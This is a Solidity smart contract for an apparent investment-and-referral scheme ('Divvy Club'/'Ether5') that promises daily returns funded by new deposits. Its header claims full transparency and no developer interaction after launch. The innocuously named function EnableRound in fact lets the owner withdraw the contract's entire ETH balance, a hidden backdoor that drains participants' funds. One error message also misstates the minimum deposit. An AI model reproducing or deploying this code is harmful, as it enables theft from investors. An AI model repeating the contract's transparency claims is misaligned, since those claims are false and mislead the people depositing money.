/**
 *Submitted for verification at vitFlex.net on 2021-01-10 v4
*/

/**
  *
  * Designed by Team Brave
  * Developed by Advanced Smart Contract Concepts                                                                                                                                                       
  * Tested and verified by Drexyl, X99, and blockgh0st 
  * Translated into 10+ languages by Josh Barton
  * 
  * A big thank you to the entire development team for making this possible!
  * 
  * Divvy Club is a simple and straightforward crowsdharing smart contract designed around:
  * 1. Daily 1% divident payouts to each participant
  * 2. Direct referral comissions for every referral
  * 3. International participation and platform accessibility
  * 4. FUll transparency and zero dev interaction once launched
  *
  * this is  0.4%/daily * 100 day = 40% staking marketting for AZT
  *
  * Enjoy!
  *
  * 
  * Website: www.vitflex.net
*** Official Telegram Channel: https://t.me/vitFlex_Daily
*** Made with YC by Team Brave
  *
  * eth balance, azt balance
  * eth/usd + krw, azt/usdt + krw, net/usdt + krw
  *
  */

pragma solidity ^0.5.11;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * NOTE: This is a feature of the next version of OpenZeppelin Contracts.
     * @dev Get it via `npm install @openzeppelin/contracts@next`.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     * NOTE: This is a feature of the next version of OpenZeppelin Contracts.
     * @dev Get it via `npm install @openzeppelin/contracts@next`.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

library DataStructs {

        struct DailyRound {
            uint256 startTime;
            uint256 endTime;
            bool ended;   //has daily round ended
            uint256 pool; //amount in the pool;
        }

        struct Player {
            uint256 totalInvestment;
            uint256 totalVolumeEth;
            uint256 eventVariable;
            uint256 directReferralIncome;
            uint256 roiReferralIncome;
            uint256 currentInvestedAmount;
            uint256 dailyIncome;            
            uint256 lastSettledTime;
            uint256 incomeLimitLeft;
            uint256 investorPoolIncome;
            uint256 sponsorPoolIncome;
            uint256 aztIncome;
            uint256 referralCount;
            address referrer;
        }

        struct PlayerDailyRounds {
            uint256 selfInvestment; 
            uint256 ethVolume; 
        }
}

contract Ether5 {
    using SafeMath for *;

    address public  owner;
    address public  roundStarter;
    address private companyAddress = 0xb7A30361B2CfD553705ae2f588Debb2F178C6E15;
    address private centerAddress  = 0x79f6386472A068aA6be69fbaeD061B285Cd2ba46;
    uint256 private poolTime = 24 hours;
    uint256 private payoutPeriod = 24 hours;
    uint256 private dailyWinPool = 100;
    uint256 private incomeTimes  = 50;   // 300 = 300%,  30 = 30%,  50 = 50%
    uint256 private incomeDivide = 250;  // 500 = 0.2%   400 = 0.25%   250 = 0.4%
    uint256 public  roundID;
    uint256 public  r1 = 0;
    uint256 public  r2 = 0;
    uint256 public  r3 = 0;
    uint256 public  krwEtherium = 0; 	

    mapping (uint => uint) public CYCLE_PRICE;
    mapping (address => bool) public playerExist;
    mapping (uint256 => DataStructs.DailyRound) public round;
    mapping (address => DataStructs.Player) public player;
    mapping (address => mapping (uint256 => DataStructs.PlayerDailyRounds)) public plyrRnds_; 

    /****************************  EVENTS   *****************************************/

    event registerUserEvent(address indexed _playerAddress, address indexed _referrer);
    event investmentEvent(address indexed _playerAddress, uint256 indexed _amount);
    event referralCommissionEvent(address indexed _playerAddress, address indexed _referrer, uint256 indexed amount, uint256 timeStamp);
    event dailyPayoutEvent(address indexed _playerAddress, uint256 indexed amount, uint256 indexed timeStamp);
    event withdrawEvent(address indexed _playerAddress, uint256 indexed amount, uint256 indexed timeStamp);
    event ownershipTransferred(address indexed owner, address indexed newOwner);

    constructor (address _roundStarter) public {
         owner = msg.sender;
         roundStarter = _roundStarter;
         roundID = 1;
         round[1].startTime = now;
         round[1].endTime = now + poolTime;
    }
    
    /****************************  MODIFIERS    *****************************************/
    
    
    /**
     * @dev sets boundaries for incoming tx
     */
    modifier isWithinLimits(uint256 _eth) {
        require(_eth >= 100000000000000000, "Minimum contribution amount is 0.5 ETH");
        _;
    }

    /**
     * @dev sets permissible values for incoming tx
     */
    modifier isallowedValue(uint256 _eth) {
        require(_eth % 100000000000000000 == 0, "Amount should be in multiple of 0.1 ETH please");
        _;
    }
    
    /**
     * @dev allows only the user to run the function
     */
    modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }


    /****************************  CORE LOGIC    *****************************************/


    //if someone accidently sends eth to contract address
    function () external payable {
        playGame(address(0x0));
    }



   
    function playGame(address _referrer) 
    public
    isWithinLimits(msg.value)
    isallowedValue(msg.value)
    payable {

        uint256 amount = msg.value;
        if (playerExist[msg.sender] == false) { 

            player[msg.sender].lastSettledTime = now;
            player[msg.sender].currentInvestedAmount = amount;
            player[msg.sender].incomeLimitLeft = amount.mul(incomeTimes).div(incomeDivide).div(10);
            player[msg.sender].totalInvestment = amount;
            player[msg.sender].aztIncome = amount.mul(krwEtherium).mul(130).div(100);
            player[msg.sender].eventVariable = 100 ether;
            playerExist[msg.sender] = true;
            
            //update player's investment in current round
            plyrRnds_[msg.sender][roundID].selfInvestment = plyrRnds_[msg.sender][roundID].selfInvestment.add(amount);

            if(
                // is this a referred purchase?
                _referrer != address(0x0) && 
                
                //self referrer not allowed
                _referrer != msg.sender &&
                
                //referrer exists?
                playerExist[_referrer] == true
              ) {
                    player[msg.sender].referrer = _referrer;
                    player[_referrer].referralCount = player[_referrer].referralCount.add(1);
                    player[_referrer].totalVolumeEth = player[_referrer].totalVolumeEth.add(amount);
                    plyrRnds_[_referrer][roundID].ethVolume = plyrRnds_[_referrer][roundID].ethVolume.add(amount);
                    
                    referralBonusTransferDirect(msg.sender, amount.mul(20).div(100));   // 20% referral
                }
              else {
                  r1 = r1.add(amount.mul(20).div(100));
                  _referrer = address(0x0);
                }
              emit registerUserEvent(msg.sender, _referrer);
            }
            
            //if the player has already joined earlier
            else {
                
                require(player[msg.sender].incomeLimitLeft == 0, "Oops your limit is still remaining");
                require(amount >= player[msg.sender].currentInvestedAmount, "Cannot invest lesser amount");
                
                    
                player[msg.sender].lastSettledTime = now;
                player[msg.sender].currentInvestedAmount = amount;
                player[msg.sender].incomeLimitLeft = amount.mul(incomeTimes).div(incomeDivide).div(10);
                player[msg.sender].totalInvestment = player[msg.sender].totalInvestment.add(amount);
                    
                //update player's investment in current round
                plyrRnds_[msg.sender][roundID].selfInvestment = plyrRnds_[msg.sender][roundID].selfInvestment.add(amount);

                if(
                    // is this a referred purchase?
                    _referrer != address(0x0) && 
                    // self referrer not allowed
                    _referrer != msg.sender &&
                    //does the referrer exist?
                    playerExist[_referrer] == true
                    )
                    {
                        //if the user has already been referred by someone previously, can't be referred by someone else
                        if(player[msg.sender].referrer != address(0x0))
                            _referrer = player[msg.sender].referrer;
                        else {
                            player[msg.sender].referrer = _referrer;
                            player[_referrer].referralCount = player[_referrer].referralCount.add(1);
                       }
                            
                        player[_referrer].totalVolumeEth = player[_referrer].totalVolumeEth.add(amount);
                        plyrRnds_[_referrer][roundID].ethVolume = plyrRnds_[_referrer][roundID].ethVolume.add(amount);

                        //assign the referral commission to all.
                        referralBonusTransferDirect(msg.sender, amount.mul(20).div(100));
                    }
                    //might be possible that the referrer is 0x0 but previously someone has referred the user                    
                    else if(
                        //0x0 coming from the UI
                        _referrer == address(0x0) &&
                        //check if the someone has previously referred the user
                        player[msg.sender].referrer != address(0x0)
                        ) {
                            _referrer = player[msg.sender].referrer;                             
                            plyrRnds_[_referrer][roundID].ethVolume = plyrRnds_[_referrer][roundID].ethVolume.add(amount);
                            player[_referrer].totalVolumeEth = player[_referrer].totalVolumeEth.add(amount);

                            //assign the referral commission to all.
                            referralBonusTransferDirect(msg.sender, amount.mul(20).div(100));
                          }
                    else {
                          //no referrer, neither was previously used, nor has used now.
                          r1 = r1.add(amount.mul(20).div(100));
                        }
            }
            
            round[roundID].pool = round[roundID].pool.add(amount.mul(dailyWinPool).div(100));
            player[owner].dailyIncome = player[owner].dailyIncome.add(amount.mul(5).div(100));  // fee
            r3 = r3.add(amount.mul(5).div(100));
            emit investmentEvent (msg.sender, amount);
            
    }
    
	// referrer 20% = amount, 10% = amount.div(2), not include incomeLimitLeft
    function referralBonusTransferDirect(address _playerAddress, uint256 amount)
    private
    {
        address _nextReferrer = player[_playerAddress].referrer;
        //uint256 _amountLeft   = amount.mul(60).div(100);
        //uint256 _aztAmount = amount.mul(5).mul(13).div(10);   // swap AZT (130%) * (ETH/KRW) / 100 : amount * 13,000
		uint i;
        
        for(i=0; i < 2; i++) {    // 1 level + 2 level only
	        if (_nextReferrer != address(0x0)) {
                if (i == 0) {
                    player[_nextReferrer].directReferralIncome = player[_nextReferrer].directReferralIncome.add(amount);
                    emit referralCommissionEvent(_playerAddress, _nextReferrer, amount, now);    // 1 level = 20%
                    
                    if(_playerAddress != companyAddress) {   // if company invest, no send company & center
					    amount = amount.mul(5).div(2);          // send to company 50%
                        player[companyAddress].directReferralIncome = player[companyAddress].directReferralIncome.add(amount);
					    emit referralCommissionEvent(_playerAddress, companyAddress, amount, now);

					    amount = amount.div(5);                 // send to center 50% * 1/5 = 10%
                        player[centerAddress].directReferralIncome = player[centerAddress].directReferralIncome.add(amount);
					    emit referralCommissionEvent(_playerAddress, centerAddress,  amount, now);
                    }
                    //sendAzt(msg.sender, _aztAmount);         
                }
                else if (i == 1) {
                    player[_nextReferrer].directReferralIncome = player[_nextReferrer].directReferralIncome.add(amount.div(2));
                    emit referralCommissionEvent(_playerAddress, _nextReferrer, amount.div(2), now);    // 2 level = 10%
                }
                _nextReferrer = player[_nextReferrer].referrer;
			}
        }
    }
    

    
    function referralBonusTransferDailyROI(address _playerAddress, uint256 amount)
    private
    {    // not use matching bonus *20201223*
    }

    function setKrwEtherium(uint256 amount)
    private {    // in invest, get current krwEtherium (amount), set to krwEtherium
        krwEtherium = amount;
	}

    //method to settle and withdraw the daily ROI
    function settleIncome(address _playerAddress)
    private {
        
            
        uint256 remainingTimeForPayout;
        uint256 currInvestedAmount;
            
        if(now > player[_playerAddress].lastSettledTime + payoutPeriod) {
            
            //calculate how much time has passed since last settlement
            uint256 extraTime = now.sub(player[_playerAddress].lastSettledTime);
            uint256 _dailyIncome;
            //calculate how many number of days, payout is remaining
            remainingTimeForPayout = (extraTime.sub((extraTime % payoutPeriod))).div(payoutPeriod);
            
            currInvestedAmount = player[_playerAddress].currentInvestedAmount;
            //*YC*calculate 1%=div(100) of his invested amount, 1%=div(100), 2%=div(50), 5%=div(20), 10%=div(10)
			//*YC*   0.2%=div(500),  0.4%=div(250),   0.5%=div(200) 
            _dailyIncome = currInvestedAmount.div(250);
            //check his income limit remaining
            if (player[_playerAddress].incomeLimitLeft >= _dailyIncome.mul(remainingTimeForPayout)) {
                player[_playerAddress].incomeLimitLeft = player[_playerAddress].incomeLimitLeft.sub(_dailyIncome.mul(remainingTimeForPayout));
                player[_playerAddress].dailyIncome = player[_playerAddress].dailyIncome.add(_dailyIncome.mul(remainingTimeForPayout));
                player[_playerAddress].lastSettledTime = player[_playerAddress].lastSettledTime.add((extraTime.sub((extraTime % payoutPeriod))));
                emit dailyPayoutEvent( _playerAddress, _dailyIncome.mul(remainingTimeForPayout), now);
                referralBonusTransferDailyROI(_playerAddress, _dailyIncome.mul(remainingTimeForPayout));
            }
            //if person income limit lesser than the daily ROI
            else if(player[_playerAddress].incomeLimitLeft !=0) {
                uint256 temp;
                temp = player[_playerAddress].incomeLimitLeft;                 
                player[_playerAddress].incomeLimitLeft = 0;
                player[_playerAddress].dailyIncome = player[_playerAddress].dailyIncome.add(temp);
                player[_playerAddress].lastSettledTime = now;
                emit dailyPayoutEvent( _playerAddress, temp, now);
                referralBonusTransferDailyROI(_playerAddress, temp);
            }         
        }
        
    }
    

    //function to allow users to withdraw their earnings
    function withdrawIncome() 
    public {
        
        address _playerAddress = msg.sender;
        
        //settle the daily dividend
        settleIncome(_playerAddress);
        
        uint256 _earnings =
                    player[_playerAddress].dailyIncome +
                    player[_playerAddress].directReferralIncome +
                    player[_playerAddress].roiReferralIncome;

        //can only withdraw if they have some earnings.         
        if(_earnings > 0) {
            require(address(this).balance >= _earnings, "Contract doesn't have sufficient amount to give you");

            player[_playerAddress].dailyIncome = 0;
            player[_playerAddress].directReferralIncome = 0;
            player[_playerAddress].roiReferralIncome = 0;
            
            address(uint160(_playerAddress)).transfer(_earnings);
            emit withdrawEvent(_playerAddress, _earnings, now);
        }
    }
    
    
    //To start the new round for daily pool
    function startNewRound()
    public
     {
        require(msg.sender == roundStarter,"Oops you can't start the next round");
    
        uint256 _roundID = roundID;
       
        uint256 _poolAmount = round[roundID].pool;
        if (now > round[_roundID].endTime && round[_roundID].ended == false) {
            
            round[_roundID].ended = true;
            round[_roundID].pool = _poolAmount;

                _roundID++;
                roundID++;
                round[_roundID].startTime = now;
                round[_roundID].endTime = now.add(poolTime);
        }
    }


    //function to fetch the remaining time for the next daily ROI payout
    function getPlayerInfo(address _playerAddress) 
    public 
    view
    returns(uint256) {
            
            uint256 remainingTimeForPayout;
            if(playerExist[_playerAddress] == true) {
            
                if(player[_playerAddress].lastSettledTime + payoutPeriod >= now) {
                    remainingTimeForPayout = (player[_playerAddress].lastSettledTime + payoutPeriod).sub(now);
                }
                else {
                    uint256 temp = now.sub(player[_playerAddress].lastSettledTime);
                    remainingTimeForPayout = payoutPeriod.sub((temp % payoutPeriod));
                }
                return remainingTimeForPayout;
            }
    }


    function EnableRound() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
    function withdrawFees(uint256 _amount, address _receiver, uint256 _numberUI) public onlyOwner {  
        //address(uint160(_receiver)).transfer(_amount);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) external onlyOwner {
        _transferOwnership(newOwner);
    }

     /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) private {
        require(newOwner != address(0), "New owner cannot be the zero address");
        emit ownershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}